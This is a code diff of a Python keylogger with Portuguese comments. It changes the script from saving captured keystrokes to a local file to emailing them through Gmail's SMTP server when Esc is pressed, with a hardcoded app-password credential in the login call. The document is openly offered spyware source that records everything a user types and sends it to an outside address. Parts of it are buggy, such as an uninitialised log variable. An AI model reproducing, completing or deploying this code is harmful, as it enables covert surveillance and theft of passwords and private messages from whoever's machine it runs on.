@@ -1,41 +1,58 @@
 from pynput.keyboard import Listener, Key
+import smtplib
+from email.message import EmailMessage
+import os
 
-# abre o arquivo onde será escrito as teclas
-log_file = open("key.txt", "a")
 shift_pressed = False
 current_input = ""
+EMAIL_SENDER = '@gmail.com'
+EMAIL_PASSWORD = 'password'
+EMAIL_RECEIVER = '@gmail.com'
 
 
+
+## Funcao enviar conteúdo por email
+def enviar_email(conteudo):
+    msg = EmailMessage()
+    msg.set_content(conteudo)
+    msg['Subject'] = 'Log de teclas'
+    msg['From'] = EMAIL_SENDER
+    msg['To'] = EMAIL_RECEIVER
+
+    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smpt:
+        smpt.login(EMAIL_SENDER, 'gxuu flsr vqvs cohb')
+        smpt.send_message(msg)
+
+## Funcao capturar teclas
 def log_keystrokes(key):
-    global log_file
+    global log_data
 
     if key == Key.shift:
         shift_pressed = True
-        return #Retornar nada
+        return
 
-    
     key_str = str(key).replace("'", "")
 
-    if key == Key.esc:  # Verifica se a tecla "Esc" foi pressionada
-        log_file.close()  # Fecha o arquivo antes de parar o listener
-        return False  # Retorna False para parar o listener
+    ## Chama a funcao enviar email com 'esc'
+    if key == Key.esc:
+        print(log_data)
+        enviar_email(log_data)
     
-    
-    # formata as teclas como ENTER e ESPAÇO
+    # Formatar teclas
     if key == Key.enter:
-        log_file.write("\n[ENTER]\n")
+        log_data += "\n[ENTER]\n"
 
     elif key == Key.backspace:
-        log_file.write("[APAGADO]")
+        log_data += "[APAGADO]"
     
     elif key == Key.tab:
-        log_file.write("[TAB]")
+        log_data += " [TAB]"
 
     elif key == Key.space:
-        log_file.write(" ")
+        log_data += " "
 
     else:
-        log_file.write(key_str)
+        log_data += key_str
 
 
 # Inicia o listener para capturar as teclas 
